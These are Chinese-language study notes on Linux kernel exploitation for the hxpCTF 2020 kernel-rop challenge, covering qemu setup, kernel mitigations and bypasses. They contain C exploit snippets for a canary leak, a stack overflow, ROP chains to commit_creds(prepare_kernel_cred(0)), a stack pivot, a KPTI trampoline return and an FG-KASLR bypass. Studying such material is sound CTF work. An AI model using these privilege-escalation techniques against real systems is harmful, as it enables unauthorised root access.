# Learning Linux Kernel Exploitation

这一刻还是来了吗，kernel？参考教程：
- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
- https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/
- https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/

此为极简（存疑）笔记，尝试直接把知识点记下来（我也不知道它重不重要，记就完了）

kernel pwn目标：攻击在启动时安装到内核中的自定义内核模块。

大部分情况会给出module相关的文件，用qemu做模拟器。极特别情况会给VMWare或者VirtualBox的镜像，甚至不给任何模拟环境。拿hxpCTF 2020的kernel-rop给的文件举例：
- [vmlinuz](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/vmlinuz) - 压缩的Linux kernel文件, 有时候称之为bzImage, 可用vmlinux将其解压为真正的kernel elf文件
- [initramfs.cpio.gz](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/initramfs.cpio.gz) - 用cpio和gzip压缩的linux文件系统。比如/bin,/etc，通常有漏洞的kernel模块也在里面。其他题目可能用其他的压缩方式
- [run.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/run.sh) - 一个包含qemu命令的脚本文件。可自行修改配置

（建议下载文件跟着教程做，排查一下自己的系统有没有运行、调试等问题）

可用[脚本](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh)从vmlinuz里解压出kernel elf文件。解压是为了找里面的rop gadget。kernel里的rop和普通情况下差不多。找gadget也是用ROPgadget命令，但是建议一拿到题就运行命令，并将输出结果保存到一个文件中
```sh
ROPgadget --binary ./vmlinux > gadgets.txt
```
这是因为kernel image很大，命令耗时较长。

解压linux文件系统的命令取决于题目的压缩方式(推荐把文件系统解压到一个空文件夹下，不然和题目文件混在一起乱得摸不着头脑)。解压不仅是为了拿到有漏洞的模块，还能让我们修改这个文件系统里的文件。从/etc入手，因为启动后大部分运行的初始化脚本都存储在这。特别注意寻找下面这行（通常在/etc/init.d/rcS或者/etc/inittab）然后修改
```sh
setuidgid 1000 /bin/sh
#改成下面的
setuidgid 0 /bin/sh
```
这行代码用于在启动后开启一个UID为1000的非root shell。把UID改成0后，我们就有了root shell。这么做是为了查看下面这些文件，它们提供的信息有助于我们利用漏洞
- /proc/kallsyms 列出加载到kernel中的所有symbol的地址
- /sys/module/core/sections/.text 给出kernel `.text`段的地址，也是base address（虽然有些题目没有/sys文件夹，不过base address还可以从/proc/kallsyms拿）

切记运行poc时把UID设回1000，防止我们以为自己拿到了root shell，但其实没有

后面写出poc还要把poc放回解压的文件系统中，然后重新压缩成要求的格式。

分析qemu命令：
```sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```
- -m 指定内存大小。假如因为某种原因没法启动模拟器，尝试提高内存大小。
- -cpu 指定CPU model，+smep 和 +smap启用SMEP 和 SMAP mitigation feature（linux的漏洞缓解机制，下面有）
- -kernel 指定压缩的kernel image
- -initrd 指定压缩的文件系统
- -append 指定额外的启动选项。也可以在这选择是否启用漏洞缓解
- -hdb 把flag.txt放进/dev/sda

更多qemu相关参考 https://manpages.debian.org/jessie/qemu-system-x86/qemu-system-x86_64.1.en.html

记得给qemu命令添加个-s选项(就在-append后面加个-s即可)，这样就能远程调试模拟器的kernel了。如果没有安装qemu-system-x86_64的话，可以尝试：
- `sudo apt-get install qemu-system`:这个直接把qemu-system全家桶装上了，不仅仅是qemu-system-x86_64
- `sudo apt-get install -y qemu-system-x86-64`:单纯装qemu-system-x86_64

然后运行qemu命令即可。再打开个cmd界面就能用gdb调试了。建议调试远程kernel时禁用peda, pwndbg或者GEF，这些插件有时候会奇奇怪怪的。直接用`gdb --nx vmlinux`
```sh
gdb --nx vmlinux
(gdb) target remote localhost:1234 #这个localhost:1234似乎是默认的，我运行qemu后啥也没设置也能连接上
```

就像用户态程序的ASLR, stack canaries, PIE（我现在才知道这些东西叫漏洞缓解机制），kernel也有自己的漏洞缓解机制。
- [Kernel stack cookies(or canaries)](http://www.phrack.org/issues/49/14.html#article):和用户态的stack canary完全一致。编译时启用且无法被禁用
- [Kernel address space layout randomization(KASLR)](https://lwn.net/Articles/569635/)：也和用户态的ASLR相似。每次系统启动，kernel挂载时，该机制随机化kernel的基地址。可以在qemu的-append选项里添加kaslr或者nokaslr启用/禁用该功能
- [Supervisor mode execution protection(SMEP)](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf):当进程在kernel mode的话，标记页表中所有用户态内存页不可执行。kernel中可通过设置控制寄存器CR4的第20个bit启用。用boot启动时，可通过在-cpu选项后加上+smep启用；在-append后加上nosmep禁用
- [Supervisor Mode Access Prevention(SMAP)](https://lwn.net/Articles/517475/)：当进程处于内核模式时，此功能将页表中所有用户态内存页标记为不可访问，意味着这回连读和写都不行了。kernel中可通过设置控制寄存器CR4的第21个bit启用。用boot启动时，可通过在-cpu选项后加上+smap启用；在-append后加上nosmap禁用
- [Kernel page-table isolation(KPTI)](https://lwn.net/Articles/741878/):用两组页表将用户空间和内核空间的页表完全隔离，而不是使用一个同时包含用户空间和内核空间地址的页表。可通过在-append选项后添加kpti=1或nopti启用/禁用

然后就是分析hackme.ko了（在解压后的文件系统里）。个人建议拿ida或者ghidra反编译看看，有些函数一般pwn不常见，熟悉一下。在`hackme_init`里用`misc_register`注册了一个名为hackme的设备。这段在ghidra里有点谜语人，设备的详细信息在一个名为hackme_misc的结构里，点开后有个`s_hackme_0010025c`，是设备名；`hackme_fops`是记录所有操作的结构：hackme_read, hackme_write, hackme_open和hackme_release。这意味着我们可以通过打开/dev/hackme与这个模块交互并执行读写操作。

对设备执行读或写操作会调用kernel里的hackme_read或hackme_write。代码审计部分略过，此题漏洞在于buffer overflow。

ret2usr：我们能控制用户态（userland，似乎这个翻译不太准确）的内容，那就能采用与ret2shellcode类似的思路，把shellcode放到userland，然后让程序流跳转到userland。所以可以覆盖kernel所调用函数的返回地址为shellcode所在的userland地址。因为漏洞函数是个kernel函数，所以即使我们的shellcode在userland，跳转过去后还是在kernel mode下执行。

这种办法需要关闭smep，smap，kpti和kaslr。可以说已经过时了。但是借这个漏洞poc熟悉一下kernel pwn流程还是可以的。

在与模块交互之前，需要先打开它。打开device的方法和打开普通文件的方法相同。
```c
int global_fd;
void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
}
```
然后就能用global_fd读和写了。泄露canary也不难，此题的buf为0x80字节，canary跟在后面。如果把数据读进unsigned long的数组（每个元素8字节），那么canary在偏移为16的位置。
```c
unsigned long cookie;
void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak)); //所以似乎打开device后直接就是stack了
    cookie = leak[16];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}
```
我在ghidra里看到buffer在stack-0xa0,为什么这里说长度是0x80？划到函数最底下，发现pop了3个寄存器。看来kernel里栈上存储的寄存器比userland的pwn多了两个r12和rbx。再加上canary和rbp，共占0x20.0x80+0x20=0xa0，没问题。目前我们了解到了栈上的布局：
```
buf
canary
rbx
r12
rbp
```
最后还是利用unsigned long数组和write写返回地址
```c
void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret，escalate_privs是下面调用commit_creds(prepare_kernel_cred(0))的shellcode
    ssize_t w = write(global_fd, payload, sizeof(payload));
}
```
kernel pwn里不用`system("/bin/sh")`或`execve("/bin/sh", NULL, NULL)`getshell，而是需要获取系统的root权限然后弹一个root shell。通常利用commit_creds()和prepare_kernel_cred()这俩已经在kernel-space里的函数。只需像这样调用两个函数：
```c
commit_creds(prepare_kernel_cred(0))
```
关闭kaslr的情况下，这两个函数的地址每次boot都是一样的。直接从/proc/kallsyms获取地址：
```sh
cat /proc/kallsyms | grep commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
```
怎么调用都行，只需要连续调用这两个函数然后让其中一个函数的返回值作为另一个函数的参数即可。参考作者的写法，用intel syntax直接在C里写汇编。

还没结束，写好shellcode，填好返回地址（这个返回地址是我们在poc里写的一个函数的地址，因此还在kernel里）后，我们仍然在kernel mode执行，需要返回到user mode。如果kernel正常运行，在遇见其中一个指令(x86_64)后会返回userland：sysretq或iretq。通常都用iretq，因为sysretq比较难用。iretq只需要按下面的顺序在栈上设置好5个userland寄存器值：RIP|CS|RFLAGS|SP|SS

程序记录两套不同的寄存器值，一个给user mode，另一个给kernel mode。对于rip，可以直接把它设置成弹shell的函数。然而其它寄存器不能随便设置，不然可能没法正常执行。这个好办，在进入kernel mode前记录这些寄存器的值（所以在open /dev/hackme之前都在user mode吧？），等拿到root权限后再加载回来。

还有一件事，在x86_64上，调用iretq前必须先调用swapgs。这个指令的作用是交换kernel mode和user mode的GS寄存器值。

完整exp：https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ret2usr.c

要是smep开了的话，ret2usr就没法用了。ret2usr相当于userland的ret2shellcode，仅在nx没开的时候能用。要是nx开了可以用rop。kernel也是类似的道理，开了smep就用kernel rop（krop）。有两种情况：
1. 可以溢出（几乎）任意大小的字节
2. 只能溢出到返回地址

先看第一种情况。

当代码在kernel mode中执行时，我们可以利用诸如`mov cr4, rdi`的指令修改cr4寄存器的值。这类指令native_write_cr4()有很多，这个函数本身就是用来将cr4的值修改为其参数的。更关键的是，它就在kernel里。所以绕过smep的第一种方式：用rop跳转进native_write_cr4(value)，清除cr4的第20个用于启用smep的bit。找地址：
```sh
cat /proc/kallsyms | grep native_write_cr4
```
构造rop chain的做法和userland的pwn一样，传参数找pop rdi的gadget，ret接函数返回地址。在返回提权的代码前，先去native_write_cr4把smep取消掉。需要知道当前cr4的值。要么触发kernel panic让其dump出cr4的值，要么附加个调试器去查看。这个bit就是0x100000处的1.

gadget从ROPgadget找。需要注意kernel image文件中没有标记某块区域是否能执行的信息，因此ROPgadget会尝试找所有可能的gadget，即使gadget在不可执行的区域里。如果使用一个gadget后kernel崩溃了，换一个即可。

然后你就会发现没用（跟着教程写笔记的我白写了……）。不过告诉我们可以用dmesg查看kernel ring buffer的情况。这是因为在新版kernel中，CR4的第20和21个bit是固定的（至少不是完全白记，旧版还能用）。就算我们在kernel mode中可以覆盖CR4，也无济于事。

真正的提权方式是，不要运行我们的代码，而是用rop实现。做法如下：
1. rop进prepare_kernel_cred(0)
2. rop进commit_creds()，参数为上一个函数的返回值
3. rop进swapgs ; ret，为了接下来调用iretq
4. 准备好RIP|CS|RFLAGS|SP|SS的stack，rop进iretq

事实上并没有这么简单，因为kernel里很多gadget用不了，导致可能把rax放进rdi就要费很多功夫（参考原作者的文章）。而且，ROPgadget虽然能找到swapgs，但是找不到iretq。所以只能用objdump
```sh
objdump -j .text -d ~/vmlinux | grep iretq | head -1
```
完整rop chain大概是这样构造的：
```
cookie
rbx
r12
rbp
pop rdi;ret
rdi:0
prepare_kernel_cred
mov rax,rdi;ret; //简化了一下，原wp比这复杂，但是效果是这个
commit_creds
swapgs;ret
iretq
rip
cs
rflags
sp
ss
```
能看出iretq需要的信息放在iretq后面的栈上。执行payload就获得了在第一种情况下的root shell。

那么第二种情况呢？

这回只能覆盖个返回地址，第一种情况这么长的ropchain肯定装不下。解决方式大家都不陌生——栈迁移。通过将rsp修改为一块可控可写的空间，伪造一个假stack。好消息：kernel的栈迁移比userland的要简单得多。kernel image里一堆gadget，肯定有直接改rsp/esp的。我们对那种往esp里放固定值的gadget比较感兴趣，只要保证gadget可执行且固定值对齐了即可。比如：`mov esp,0x5b000000`

虽然mov esp看起来只动了rsp的低4字节，高4字节还不是0；但是根据[文档](http://x86asm.net/articles/x86-64-tour-of-intel-manuals/#General-purpose-Registers)，x86-64下mov指令的destination要是是32位寄存器，会自动清零高32位寄存器。即，mov esp看起来只动了rsp的低4字节，其实高4字节也被清零了

假stack的构造也很简单。刚刚把esp改成了0x5b000000，那就用mmap map一块内存，把rop chain写到里面
```c
void build_fake_stack(void){
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // dummy r12
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = pop_rdi_ret;
    ... // the rest of the chain is the same as the last payload
}
```
注意事项：
1. mmap的内存地址是0x5b000000 - 0x1000而不是直接0x5b000000。这是因为需要调用prepare_kernel_cred()和commit_creds()，而这两个函数都会导致栈上升。要是我们直接让esp指到代码页的开头，会因为stack空间不够而崩溃
2. 往第一页里写点没用的填充值，不然会导致Double Fault。根据作者的理解，代码页仅在被访问后才会插入页表。而不是在mmap后。0x2000字节正好是两页，我们把rop chain放在了第二页，因此还需要访问下第一页。

现在加个kpti。如果继续运行刚刚得到的krop payload，会提示userland的Segmentation fault而不是kernel的崩溃。原因是我们其实已经回到user mode了，但页表还是kernel的，而userland的代码页全部不可执行。绕过方法如下：
1. 用signal handler：目前的问题是userland会得到SIGSEGV，可以对这个signal加个调用get_shell函数的signal handler，如`signal(SIGSEGV, get_shell);`。神奇的地方在于，虽然get_shell()函数本身在不可执行的代码页，但是当触发SIGSEGV后就能正常执行了
2. 用KPTI trampoline：如果syscall正常返回，kernel里一定有一块代码用于将页表从kernel换回userland。所以我们可以尝试重用那块代码。这块代码就叫KPTI trampoline，调用swapgs然后iretq

KPTI trampoline在swapgs_restore_regs_and_return_to_usermode()函数中，继续用/proc/kallsyms找到其地址：
```sh
cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
```
这个函数开头有一堆pop，直接rop到开头倒是可以，但没必要，只会徒增ropchain的长度。我们要的KPTI trampoline在`swapgs_restore_regs_and_return_to_usermode + 22`，即函数的第一个mov指令处。gadgets如下：
```sh
.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
.text:FFFFFFFF81200F89                               pop     rax
.text:FFFFFFFF81200F8A                               pop     rdi
.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
...
.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
.text.native_swapgs:FFFFFFFF8146D4E8                 retn
...
.text:FFFFFFFF8120102E                               mov     rdi, cr3
.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067
...
.text:FFFFFFFF81201067                               or      rdi, 1000h
.text:FFFFFFFF8120106E                               mov     cr3, rdi
...
.text:FFFFFFFF81200FC7                               iretq
```
那么ropchain的最后一段构造如下：`KPTI_trampoline|dummy RAX|dummy RDI|RIP|CS|RFLAGS|SP|SS`
```c
void overflow(void){
    // ...
    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    payload[off++] = kpti_trampoline; //swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
    // ...
}
```
这段payload甚至比单独找swapgs和iretq还要简单，而且即使没有kpti也能用（大部分情况kpti和smep搭配着一起启用）。因此，推荐默认情况下直接用这段。栈迁移情况下就把这段放进假stack即可

最后是smap。还记得rop的两种情况吗？要是是第一种，没啥影响，因为ropchain在kernel stack上，我们完全不需要访问userland的数据。然而第二种就不行了，我们把stack迁移到了userland的代码页，push和pop访问数据会被组阻止。目前这题的漏洞作者暂时不知道该如何利用来写出成功的exp。

kaslr的绕过方式和aslr一模一样。虽然基址随机了，但是每个函数相对于基址的偏移是固定的。泄露一个地址后算出基址再算别的函数即可。

[Function Granular KASLR](https://lwn.net/Articles/824307/)要复杂得多。多启动几次系统然后看/proc/kallsyms，会发现大部分symbol的地址完全随机，和基址没有关系。即，它们的地址与kernel `.text` base不是固定的偏移。

FG-KASLR不是完美的，kernel里的某些区域完全没有随机化。以下是一些有用的未受影响的区域：
1. 从`_text` base到`__x86_retpoline_r15`（`_text+0x400dc6`）中间的函数。commit_creds()和prepare_kernel_cred()不在这里面
2. swapgs_restore_regs_and_return_to_usermode()里的KPTI trampoline
3. kernel symbol table ksymtab，开始于`_text+0xf85198`。这里包含用于计算commit_creds()和prepare_kernel_cred()地址的偏移

ksymtab里一个entry的结构：
```c
struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
```
我们感兴趣的是value_offset，它是ksymtab里symbol entry的地址到symbol真正的地址的偏移。拿entry地址：
```sh
cat /proc/kallsyms | grep ksymtab_commit_creds
cat /proc/kallsyms | grep ksymtab_prepare_kernel_cred
```
这种情况泄露image基地址也要依靠未受影响的区域。附加调试器上查看kernel stack，找到那些属于未受影响区域的地址，然后减去偏移得到基地址。

有基地址后，从ksymtab_commit_creds读出value_offset然后加上基地址就是commit_creds的地址。
```c
void stage_1(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_commit_creds]
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_commit_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
    ssize_t w = write(global_fd, payload, sizeof(payload));
}
```
虽然KPTI trampoline里面有个pop rax而且我们用了个dummy rax填充进去，但是不用担心泄露的`__ksymtabs_commit_creds`没了。函数结束后rax就恢复回来了。

用trampoline回到userland(我们exp里写的代码应该全在userland，总不能写着写着写进kernel了吧？)后接着用get_commit_creds获取commit_creds的完整地址。
```c
void get_commit_creds(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)tmp_store;
}
```
tmp_store是个unsigned long的全局变量，写汇编时可以直接将其作为mov的目的操作数（是叫这个吗？）。前面保存userland寄存器时也是同样的方法。用的时候记得转成int，因为value_offset是int。

泄露prepare_kernel_cred也是相同的步骤。最后就是开root shell了，这步比较简单，再来一遍rop chain然后trampoline返回到userland getshell函数。

hxpCTF 2020的kernel-rop的官方wp没有开成root shell，只能开/dev/sda读flag。虽然wp和作者用的是一种思路。看来即使思路一样，代码不一样也会导致不同的结果。

总结：
1. 啥也没开，ret2usr
2. smep：rop调用commit_creds(prepare_kernel_cred(0))
3. 溢出字节只够返回值，栈迁移（smap情况下不行）
4. kpti，用KPTI trampoline或signal handler
5. kaslr，泄露`.text`地址计算基地址
6. FG-KASLR，利用未被影响的区域+ksymtab获取函数偏移

完整exp：https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/a.c

最后记得完整看一遍exp，或者说看下它的执行流程。我发现每次往/dev/hackme写东西都会触发漏洞，都是漏洞->ropchain->漏洞->ropchain……是不是每次ropchain后漏洞都会重置啊？不对，应该说，是不是每次回到userland再往/dev/hackme写东西回到kernel mode漏洞就会重置？应该是吧。